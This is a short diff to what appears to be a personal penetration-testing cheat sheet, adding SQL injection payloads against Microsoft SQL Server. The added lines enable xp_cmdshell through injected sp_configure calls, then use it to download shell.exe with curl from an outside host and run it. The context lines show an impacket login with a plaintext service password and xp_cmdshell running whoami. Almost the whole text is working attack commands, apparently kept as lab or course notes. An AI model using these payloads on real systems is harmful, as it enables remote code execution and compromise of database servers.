@@ -384,6 +384,12 @@ impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth
 enable_xp_cmdshell
 xp_cmdshell whoami
 
+# SQL Injection
+' EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; --
+' ;EXEC xp_cmdshell "curl http://192.168.45.223/shell.exe -o C:\User\Public\shell.exe"--
+' ;EXEC xp_cmdshell "C:\User\Public\shell.exe"--
+
+
 # Classic from the course
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
